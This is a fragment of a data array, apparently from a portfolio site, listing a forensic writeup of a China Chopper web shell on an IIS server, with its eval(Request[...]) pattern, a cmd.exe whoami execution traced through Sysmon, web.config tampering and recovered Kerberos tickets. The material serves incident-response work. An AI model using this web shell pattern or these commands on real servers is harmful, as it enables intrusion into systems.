        writeup: `WebShell - C:\\inetpub\\wwwroot\\Upload\\files.aspx China Chopper eval(Request[023]) -> w3wp.exe cmd.exe /c whoami (Sysmon EID1, ParentImage w3wp.exe) -> web.config compilation tempDirectory C:\\Temp tamper + 2 TGS ldap/sdc01 cifs/sdc01 via klist.`,
    outcomeMetric: '1 web shell + 2 TGS recovered · IIS logs correlated',
    links: [{ kind: 'writeup', url: null, label: 'Silent WebShell — on request' }],
  },

];
